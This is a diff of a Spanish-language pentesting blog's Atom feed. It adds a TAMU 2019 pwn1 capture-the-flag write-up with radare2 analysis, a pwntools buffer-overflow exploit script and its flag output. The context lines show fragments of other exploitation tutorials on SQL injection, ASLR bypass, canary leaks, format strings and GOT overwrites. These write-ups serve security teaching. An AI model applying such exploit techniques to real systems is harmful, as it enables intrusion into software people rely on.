@@ -1,4 +1,113 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-04T20:24:58-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">picoCTF web gauntlet - sql injection y evadiendo filtros</title><link href="http://localhost:4000/picoCTF-web-gauntlet/" rel="alternate" type="text/html" title="picoCTF web gauntlet - sql injection y evadiendo filtros" /><published>2023-01-04T00:00:00-06:00</published><updated>2023-01-04T00:00:00-06:00</updated><id>http://localhost:4000/picoCTF-web-gauntlet</id><content type="html" xml:base="http://localhost:4000/picoCTF-web-gauntlet/">&lt;p&gt;Para este desafio tenemos que hacer bypass de varios filtros usando sql injection, el SGBD es sqlite y el usuario para todos los casos es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-06T21:12:32-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">TAMU 2019 pwn1 - BufferOverflow</title><link href="http://localhost:4000/TAMU-2019-pwn1/" rel="alternate" type="text/html" title="TAMU 2019 pwn1 - BufferOverflow" /><published>2023-01-06T00:00:00-06:00</published><updated>2023-01-06T00:00:00-06:00</updated><id>http://localhost:4000/TAMU-2019-pwn1</id><content type="html" xml:base="http://localhost:4000/TAMU-2019-pwn1/">&lt;p&gt;El binario lo pueden descargar con:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/tamu19_pwn1/pwn1&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;analisis&quot;&gt;Analisis&lt;/h2&gt;
+
+&lt;p&gt;El binario cuenta con las siguientes protecciones:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   77 Symbols	  No	0		2		pwn1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;No tienec Canary asi que podemos intentar un buffer overflow, sin embargo tiene NX, asi que no podemos ejecutar una shellcode.&lt;/p&gt;
+
+&lt;p&gt;Aqui intente ejecutar el binario pasandole lo que sea y luego tratando de ocasionar un buffer overflow:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tamu-pwn1/binario1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero de ninguna forma funciono, asi que vamos a ver que esta pasando, para el reversing usare radare2&lt;/p&gt;
+
+&lt;p&gt;Y miren, aqui tenemos la funcion que recibe nuestro input:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tamu-pwn1/radare1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo mas descatable son las instrucciones:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;lea eax, [ebx - 0x159f]: Que lo que esta haciendo es cargar la direccion de memoria que esta contenida en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebx-0x159f&lt;/code&gt;, esto significa que se está leyendo la dirección de memoria contenida en la ubicación de memoria apuntada por ebx-0x159f y luego cargando esa dirección en el registro eax. y lo que tiene esa direccion de memoria es nuestro input&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;push eax: Luego nuestro input lo mete al stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;lea eax, [ s1]: Esto hace lo mismo que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea eax, [ebx - 0x159f]&lt;/code&gt; pero ahora hay que tomar en cuenta que lo esta haciendo con lo que tiene la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt;, esta se esta declarando como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var char *s1 @ ebp-0x3b&lt;/code&gt; y esta esta 56 bytes por debajo del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EBP&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Despues tenemos una comparacion que es:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tamu-pwn1/radare2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que hace primero con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add&lt;/code&gt; es sumarle 16 bytes al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ESP&lt;/code&gt;, esto con el fin para ajustar la posicion del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ESP&lt;/code&gt; en el stack. Despues con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text&lt;/code&gt;se hace una operacion AND bit a bit entre lo que le metimos como input y lo que tiene &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt;, y esto sirve ya que despues tenemos la intruccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;je&lt;/code&gt; que significa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;salta si es igual&lt;/code&gt;, asi que si el input y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;si&lt;/code&gt; son iguales, la flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZF&lt;/code&gt; se establece en 1 y salta a la direccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x5655582f&lt;/code&gt; y si no, la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZF&lt;/code&gt; se establace en 0 y en esta caso lo que pasa es que el programa se detiene como se puede ver aqui en esta imaguen que pinte jiji:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tamu-pwn1/radare3.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si son iguales el programa sigue con la ejecucion desde la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x5655582f&lt;/code&gt; (color amarillo), y si no simplemente hace un exit y se detiene (color rojo).&lt;/p&gt;
+
+&lt;p&gt;Despues en el programa tenemos otro input, pero es exactamente lo mismo que el que acabe de explicar, solo que la pregunta seria… ¿Cual es el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt; con el que nuestro input se esta comparando?, y lo que se me ocurrio a mi fue: si la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt; se esta declarando como una variable global, entonces en la seccion .rodata el binario debe de estar, esto es por que en .rodata se encuentran las variables inicializadas globalmente pero de solo lectura, entonces se mostre la seccion .rodata con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iz&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tamu-pwn1/radare4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y wow, ahora sabemos que nuestros inputs se estan comparando con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sir Lancelot of Camelot&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;To seek the Holy Grail&lt;/code&gt;, y wow, esto es completamente inutil ya que no nos sirve para nada jaja, lo que en realidad nos sirve es lo que sigue y es donde dice:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What... is my secret?&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y aqui es otro input y su codigo en emsamblador es:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tamu-pwn1/radare5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto es un mas facil de analizar, simplemente compara lo que se almacena en&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10h&lt;/code&gt; con el valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdea110c8&lt;/code&gt; y si son iguales manda a llama a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sym.print_flag&lt;/code&gt;, que basicamente es la que imprime la flag.&lt;/p&gt;
+
+&lt;p&gt;Y para explotarlo, tenemos que hacer es sobreescribir el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10&lt;/code&gt; usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;, pero no es tan obvio como parece, tenemos que tomar en cuenta en donde se ubican dos variables: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;, esto con el fin de saber el desplazamiento entre esas dos y saber cuantos bytes hay que meter.&lt;/p&gt;
+
+&lt;p&gt;Para saber donde esta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10&lt;/code&gt; vemos la declaracion de la variable:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var uint32_t var_10h @ ebp-0x10&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta esta 0x10 por debajo del EBP, es decir, 16 bytes.&lt;/p&gt;
+
+&lt;p&gt;Y para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var char *s1 @ ebp-0x3b&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta a 0x3b, es decir, 59 bytes&lt;/p&gt;
+
+&lt;p&gt;Entonces tenemos un desplazamiento de 59 - 16 = 43, asi que debemos de escribir 43 bytes antes de sobreescribir la variable&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./pwn1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#Esto es el padding
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdea110c8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#el valor por la cual la vamos a sobreescribir
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sir Lancelot of Camelot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;To seek the Holy Grail.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y listo&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 exploit.py
+
+[+] Starting local process './pwn1': pid 26329
+/home/c4rta/Downloads/exploit.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  target.sendline(&quot;Sir Lancelot of Camelot&quot;)
+/home/c4rta/Downloads/exploit.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  target.sendline(&quot;To seek the Holy Grail.&quot;)
+[*] Switching to interactive mode
+Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
+What... is your name?
+What... is your quest?
+What... is my secret?
+Right. Off you go.
+flag{g0ttem_b0yz} --&amp;gt; la flag
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="bof-stack-based" /><summary type="html">Resolucion del ejercicio pwn1 de TamuCTF. Bueno para practicar BoF</summary></entry><entry><title type="html">picoCTF web gauntlet - sql injection y evadiendo filtros</title><link href="http://localhost:4000/picoCTF-web-gauntlet/" rel="alternate" type="text/html" title="picoCTF web gauntlet - sql injection y evadiendo filtros" /><published>2023-01-04T00:00:00-06:00</published><updated>2023-01-04T00:00:00-06:00</updated><id>http://localhost:4000/picoCTF-web-gauntlet</id><content type="html" xml:base="http://localhost:4000/picoCTF-web-gauntlet/">&lt;p&gt;Para este desafio tenemos que hacer bypass de varios filtros usando sql injection, el SGBD es sqlite y el usuario para todos los casos es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://jupiter.challenges.picoctf.org:41560/&lt;/code&gt; –&amp;gt; Pagina vulnerable&lt;/p&gt;
 
@@ -1397,9 +1506,7 @@ $ whoami
 omarh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bypass-aslr/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="ret2libc" /><category term="aslr-bypass" /><category term="bof-stack-based" /><summary type="html">En este articulo veremos como hacer bypass del ASLR y NX en Linux x64</summary></entry><entry><title type="html">Leak stack canary - bypass</title><link href="http://localhost:4000/leak-stack-canary/" rel="alternate" type="text/html" title="Leak stack canary - bypass" /><published>2022-08-03T00:00:00-05:00</published><updated>2022-08-03T00:00:00-05:00</updated><id>http://localhost:4000/leak-stack-canary</id><content type="html" xml:base="http://localhost:4000/leak-stack-canary/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="ret2libc" /><category term="aslr-bypass" /><category term="bof-stack-based" /><summary type="html">En este articulo veremos como hacer bypass del ASLR y NX en Linux x64</summary></entry><entry><title type="html">Leak stack canary - bypass</title><link href="http://localhost:4000/leak-stack-canary/" rel="alternate" type="text/html" title="Leak stack canary - bypass" /><published>2022-08-03T00:00:00-05:00</published><updated>2022-08-03T00:00:00-05:00</updated><id>http://localhost:4000/leak-stack-canary</id><content type="html" xml:base="http://localhost:4000/leak-stack-canary/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Que es el stack canary y como funciona&lt;/li&gt;
@@ -1634,9 +1741,7 @@ Continuing.
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/pwn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="format-string" /><category term="canary-bypass" /><summary type="html">En este articulo veras como puedes hacer bypass del stack canary lekeandolo usando format strings</summary></entry><entry><title type="html">IOF - Integer Overflow/Underflow</title><link href="http://localhost:4000/integer-overflow/" rel="alternate" type="text/html" title="IOF - Integer Overflow/Underflow" /><published>2022-08-01T00:00:00-05:00</published><updated>2022-08-01T00:00:00-05:00</updated><id>http://localhost:4000/integer-overflow</id><content type="html" xml:base="http://localhost:4000/integer-overflow/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="format-string" /><category term="canary-bypass" /><summary type="html">En este articulo veras como puedes hacer bypass del stack canary lekeandolo usando format strings</summary></entry><entry><title type="html">IOF - Integer Overflow/Underflow</title><link href="http://localhost:4000/integer-overflow/" rel="alternate" type="text/html" title="IOF - Integer Overflow/Underflow" /><published>2022-08-01T00:00:00-05:00</published><updated>2022-08-01T00:00:00-05:00</updated><id>http://localhost:4000/integer-overflow</id><content type="html" xml:base="http://localhost:4000/integer-overflow/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Integer Overflow y underflow&lt;/li&gt;
@@ -1729,9 +1834,7 @@ Continuing.
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/integer-overflow/radare9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/integer-overflow/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="integer-overflow" /><summary type="html">En este articulo veremos como funciona y como realizar un Integer Overflow</summary></entry><entry><title type="html">GOT overwrite con Format String</title><link href="http://localhost:4000/got-overwrite/" rel="alternate" type="text/html" title="GOT overwrite con Format String" /><published>2022-07-30T00:00:00-05:00</published><updated>2022-07-30T00:00:00-05:00</updated><id>http://localhost:4000/got-overwrite</id><content type="html" xml:base="http://localhost:4000/got-overwrite/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="integer-overflow" /><summary type="html">En este articulo veremos como funciona y como realizar un Integer Overflow</summary></entry><entry><title type="html">GOT overwrite con Format String</title><link href="http://localhost:4000/got-overwrite/" rel="alternate" type="text/html" title="GOT overwrite con Format String" /><published>2022-07-30T00:00:00-05:00</published><updated>2022-07-30T00:00:00-05:00</updated><id>http://localhost:4000/got-overwrite</id><content type="html" xml:base="http://localhost:4000/got-overwrite/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;Global Offset Table (GOT) y Procedure Linked Table (PLT)&lt;/li&gt;
   &lt;li&gt;Analisis del binario&lt;/li&gt;
@@ -1910,9 +2013,7 @@ Continuing.
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/format4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="got-overwrite" /><category term="format-string" /><summary type="html">En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string</summary></entry><entry><title type="html">ImaginaryCTF date2 - GOT overwrite</title><link href="http://localhost:4000/imaginaryCTF-date2/" rel="alternate" type="text/html" title="ImaginaryCTF date2 - GOT overwrite" /><published>2022-07-30T00:00:00-05:00</published><updated>2022-07-30T00:00:00-05:00</updated><id>http://localhost:4000/imaginaryCTF-date2</id><content type="html" xml:base="http://localhost:4000/imaginaryCTF-date2/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="got-overwrite" /><category term="format-string" /><summary type="html">En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string</summary></entry><entry><title type="html">ImaginaryCTF date2 - GOT overwrite</title><link href="http://localhost:4000/imaginaryCTF-date2/" rel="alternate" type="text/html" title="ImaginaryCTF date2 - GOT overwrite" /><published>2022-07-30T00:00:00-05:00</published><updated>2022-07-30T00:00:00-05:00</updated><id>http://localhost:4000/imaginaryCTF-date2</id><content type="html" xml:base="http://localhost:4000/imaginaryCTF-date2/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Analizando el binario con Ghidra&lt;/li&gt;
@@ -2038,163 +2139,4 @@ no smh you are wrong the date is
 $ ls
 flag.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/imaginaryCTF-date2/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;font size=&quot;1&quot;&gt; como me encula esa dama&lt;/font&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="got-overwrite" /><category term="format-string" /><summary type="html">En este articulo resolveremos un ejercicio de explotacion binaria de la pagina ImaginaryCTF donde tenemos de sobreescribir GOT</summary></entry><entry><title type="html">Format string</title><link href="http://localhost:4000/format-string/" rel="alternate" type="text/html" title="Format string" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/format-string</id><content type="html" xml:base="http://localhost:4000/format-string/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;¿Que es format string?&lt;/li&gt;
-  &lt;li&gt;Calling conventions&lt;/li&gt;
-  &lt;li&gt;Lekeando valores de la memoria&lt;/li&gt;
-  &lt;li&gt;Resolviendo un pequeño ejercicio&lt;/li&gt;
-  &lt;li&gt;Visualizandolo en radare2&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;que-es-format-string&quot;&gt;¿Que es format string?&lt;/h2&gt;
-
-&lt;p&gt;Vulnerabilidad la cual ocurre cuando los inputs de los usuarios son ejecutados y procesados como comandos por una funcion vulnerable, esto permite que se puedan lekear valores de la memoria, ejecutar codigo, u ocasionar un segmentation fault&lt;/p&gt;
-
-&lt;h3 id=&quot;funciones-vulnerables&quot;&gt;Funciones vulnerables&lt;/h3&gt;
-
-&lt;p&gt;Las funciones que pueden ser vulnerables a format string son las de la familia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;, aca les dejo un listado de cuales son&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;printf()&lt;/li&gt;
-  &lt;li&gt;fprintf()&lt;/li&gt;
-  &lt;li&gt;sprintf()&lt;/li&gt;
-  &lt;li&gt;vprintf()&lt;/li&gt;
-  &lt;li&gt;snprintf()&lt;/li&gt;
-  &lt;li&gt;vsnprintf()&lt;/li&gt;
-  &lt;li&gt;vfprintf()&lt;/li&gt;
-  &lt;li&gt;vfprintf()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;El format string o cadena de formato en español es al argumento que se le pasa a una de las funciones que pueden ser vulnerables, aca una imagen de cuales son los format string y su tipo&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/format-string/formatString.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Imagen: &lt;a href=&quot;https://www.tutorialspoint.com&quot;&gt;https://www.tutorialspoint.com&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;calling-conventions&quot;&gt;Calling conventions&lt;/h2&gt;
-
-&lt;p&gt;Las calling conventions describen lo siguiente:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;El orden en que se pasan los argumentos a una funcion&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Hay que tomar en cuenta que en una arquitectura de 64 bits los primeros 6 argumentos se pasan los los registros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI, RSI, RDX, RCX, R8, R9&lt;/code&gt;, y los demas se empiezan a pasar por el stack y ese es el orden que describe las calling conventions&lt;/p&gt;
-
-&lt;h2 id=&quot;lekenado-valores-de-la-memoria&quot;&gt;Lekenado valores de la memoria&lt;/h2&gt;
-
-&lt;p&gt;Para explicar un poco mas a detalle esto vamos a ir probando con un pequeño programa en C el cual es el siguiente&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Holi:)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El codigo lo pueden compilar como sea aun que yo lo hize de esta manera&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc ejemplo.c -o ejemplo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
